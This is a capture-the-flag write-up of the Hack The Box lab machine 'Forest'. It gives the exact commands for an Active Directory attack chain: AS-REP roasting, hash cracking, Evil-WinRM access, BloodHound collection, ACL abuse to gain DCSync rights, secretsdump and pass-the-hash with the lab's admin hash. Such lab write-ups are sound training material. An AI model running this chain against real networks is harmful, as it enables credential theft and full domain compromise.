---
layout: single
title:  "HTB - Forest Writeup - 10.10.10.161"
date:   2020-06-08 14:45:23 +0100
categories: hackthebox
excerpt: My wreiteup of the Hackthebox machine Forest
---

![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/2qlvus10kpyovinvrdjj.png)

# HTB - Forest Writeup - 10.10.10.161

This machine is rated easy difficulty and involved abusing kerberos pre-authentication to kerberoast a hash of a local service account using the impacket script `GetNPUsers`. Root required using bloodhound to visualize the AD environment and find a path to the domain admin, which included abusing ACL's to get DCSync rights.


## 1. Recon

As usual we will start with an nmap scan of the target machine.
`nmap -sC -sV -oA nmap/scan 10.10.10.161`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/y5ve5duwo71bc01j1m44.png)
The ports of note here are:
* 445 - SMB
* 88 - Kerberos
* 135 - RPC
* 5985 - Powershell - WSMan - Remote Management 


Knowing that we have rpc open we can try null authentication to get a list of user accounts
`rpcclient -U "" -N 10.10.10.161` `enumdomusers`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/ozrr70r5kgd6wk5qqosf.png)

 - One account is of particular interest as is starts with `svc` which indicates it may be a service account which would mean we can abuse its special permissions relating to local groups and users
 - We can attempt to kerberoast this user to try and get a hash we can crack

## 2. Exploitation to User

Clone the [Impacket repo](https://github.com/SecureAuthCorp/impacket) and navigate into the examples folder
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/8rrjysjhmo5awcrfk68g.png)

Now try try attacking the `svc-alfresco` account:
* If you remember from the nmap scan the domain was `htb.local`
`./GetNPUsers.py htb.local/svc-alfresco -format john -dc-ip 10.10.10.161`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/cvwm8bcl1ojxr7ew4g62.png)
Bingo! We now have the asrep hash of the user `svc-alfresco` and we can crack is using johntheripper
1. First place the hash in a file called hash.txt
2. Run `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/uladgd2oswyy4gsg5n0w.png)
* We now have the password of the user svc-alfresco - s3rvice

Now we can login to the powershell remote management port using a tool called [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
`evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/70no1wzqykv6yl5eal8j.png)

Now that we have a shell we can also grab `user.txt`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/eqt6x8uwh1bs6ixell2n.png)

## 3. Priv Esc from User to Domain Admin
* For this priv esc we will use a tool called bloodhound to visualise the Active Directory environment - follow this guide on how to set it up on your system [BloodHound Wiki](https://bloodhound.readthedocs.io/en/latest/index.html)

To begin we need to initialize the neo4j database, you can do this by running: `neo4j console`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/ncikv9qhqfgs4kv1tp58.png)

Now that the db has been launched we can launch blood hound by running `bloodhound` in a terminal
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/70n5ncns9wny2bw3z3v4.png)

Now that bloodhound is running, we need some data to analyze, we can use the SharpHound.exe file and the upload and download capabilities of Evil-WinRM to get the files.
Open a new terminal and download the SharpHound.exe file from github
`https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.exe`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/iin83gg0xty15r0wzps5.png)

Now in your Evil-WinRM terminal type: `upload SharpHound.exe`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/7od4miigwy2k6sw2bq6f.png)

Now we can run the file with the `-c All` flag to to specify we wan't to collect all data on the AD environment
`.\SharpHound.exe -c All`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/wera23epacu76kcnetfi.png)

`ls` `download 20200506091425_BloodHound.zip`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/fefgmf7zsksz6y0mk5af.png)

We now have the bloodhound zip file on our local machine so we can open it in bloodhound by dragging it into the window 
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/12nb43yp3fbjmsdsvngl.png)
* You should now see that we have a lot of data in our database

Now we can run one of the pre-made queries `Shortest Paths to Unconstrained Delegation Systems` 
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/7c9vjeaqomb8sot6xbye.png)
There are a few things that we can see now:
* We are part of the privileged IT group and as a result part of Account Operators can be a member Exchange Windows Permissions and Exchange Trusted Subsystem Group
* Firstly, this means that we can add ourselves to Exchange Windows Permissions and Exchange Trusted Subsystem Group
* This also means we can abuse ACL (Access Control List) to allow svc-alfresco to perform a DCSync attack to get the admin hash, here is a good video that explains this, [Here](https://www.youtube.com/watch?v=QfyZQDyeXjQ)

Let's try adding ourselves to this group new group:
`net group "Exchange Windows Permissions" svc-alfresco /add`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/c1rqpd51i953tflk5bzn.png)

We can also add ourselves to the `Exchange Trusted Subsystem Group` which will allow us to abuse ACL
`Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-alfresco`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/mi71qtpg1f92lk8xeyc4.png)

We can now use a tool called `aclpwn` to give `svc-alfresco` DCSync rights. There is an article here that describes it's usage very well - [ACLPWN Blog](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)

1. Lets install aclpwn in kali, it's as simple as `pip install aclpwn`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/ld4bmnztdkqyw7fd2r0e.png)

2. Lets execute this command to give us DCSync permissions
`aclpwn -f svc-alfresco -ft user -d htb.local -s 10.10.10.161` and use option 1
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/fqz304mu486dxa7brlwm.png)


3. Now we can use impacket's `secretsdump.py` to get the admin hash
`secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -dc-ip 10.10.10.161`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/u2oswynll38jweio651f.png)

### Bingo! We now have the admin hash

We can use this to logon using Evil-WinRM with the -H flag and grab `root.txt`
`evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6`
![Alt Text](https://dev-to-uploads.s3.amazonaws.com/i/r6xpmwnxroiu8qijd4d6.png)

## Rooted!

If you enjoyed my write up or found it useful check out my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

